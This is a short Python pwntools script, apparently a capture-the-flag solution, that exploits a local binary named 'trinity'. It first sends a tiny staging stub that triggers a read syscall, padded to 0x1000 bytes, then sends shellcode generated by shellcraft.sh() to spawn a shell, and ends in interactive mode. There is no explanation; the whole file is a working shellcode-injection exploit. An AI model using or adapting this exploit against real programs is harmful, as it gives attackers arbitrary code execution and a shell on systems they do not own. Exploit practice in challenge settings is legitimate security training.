#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './trinity')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b main
c
'''.format(**locals())

io = start()
io.send(b'\x5a\x0f\x05'.ljust(0x1000, b'\x05'))
io.send(b'A'*3 + asm(shellcraft.sh()))
io.interactive()

